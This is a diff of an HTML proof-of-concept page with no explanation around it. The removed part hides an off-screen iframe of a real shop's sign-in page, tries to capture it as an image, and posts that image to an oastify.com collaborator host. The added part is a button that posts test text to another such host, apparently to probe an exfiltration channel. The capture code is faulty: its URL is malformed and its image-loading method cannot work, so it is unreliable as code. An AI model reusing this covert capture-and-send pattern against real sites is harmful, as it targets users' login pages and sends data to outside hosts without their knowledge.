@@ -1,58 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Capture and Send Image</title>
-  <script>
-    function captureAndSendImage() {
-      var iframe = document.getElementById('myIframe');
-      var iframeWindow = iframe.contentWindow || iframe.contentDocument.defaultView;
-      
-      // Create an image element
-      var image = new Image();
-      
-      // Load the iframe content into the image
-      image.onload = function() {
-        var canvas = document.createElement('canvas');
-        canvas.width = iframe.offsetWidth;
-        canvas.height = iframe.offsetHeight;
-      
-        var context = canvas.getContext('2d');
-        context.drawImage(image, 0, 0, iframe.offsetWidth, iframe.offsetHeight, 0, 0, iframe.offsetWidth, iframe.offsetHeight);
-      
-        // Convert the canvas image to a base64 data URL
-        var imageData = canvas.toDataURL('image/png');
-      
-        // Send the image data to the server-side endpoint on test.com
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https:/3osnkjppby9o59r7pi0klxd89zfq3gr5.oastify.com', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.onreadystatechange = function() {
-          if (xhr.readyState === 4) {
-            if (xhr.status === 200) {
-              console.log('Image sent successfully!');
-              alert('Image sent successfully!');
-            } else {
-              console.error('Failed to send the image. Status: ' + xhr.status);
-              alert('Failed to send the image. Please try again.');
-            }
-          }
-        };
-        xhr.send(JSON.stringify({ image: imageData }));
-      };
-      
-      image.src = iframe.src;
-    }
-  </script>
-  <style>
-    #myIframe {
-      position: absolute;
-      left: -9999px;
-    }
-  </style>
+    <title>Button Click Example</title>
 </head>
 <body>
-  <h1>Capture and Send Image</h1>
-  <iframe id="myIframe" src="https://app.codashop.com/en-ph/sign-in" width="800" height="600" frameborder="0"></iframe>
-  <button onclick="captureAndSendImage()">Capture and Send Image</button>
+    <h1>Button Click Example</h1>
+
+    <button id="myButton">Click Me</button>
+
+    <script>
+        // Get the button element
+        var button = document.getElementById('myButton');
+
+        // Attach a click event listener to the button
+        button.addEventListener('click', function() {
+            // Create a new XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+
+            // Define the URL to send the text
+            var url = 'https://xyzhudzjlsjif311zcaevrn2jtpkdb10.oastify.com';
+
+            // Define the text to send
+            var textToSend = 'Hello, World!';
+
+            // Set up the request
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'text/plain');
+
+            // Send the text
+            xhr.send(textToSend);
+        });
+    </script>
 </body>
 </html>
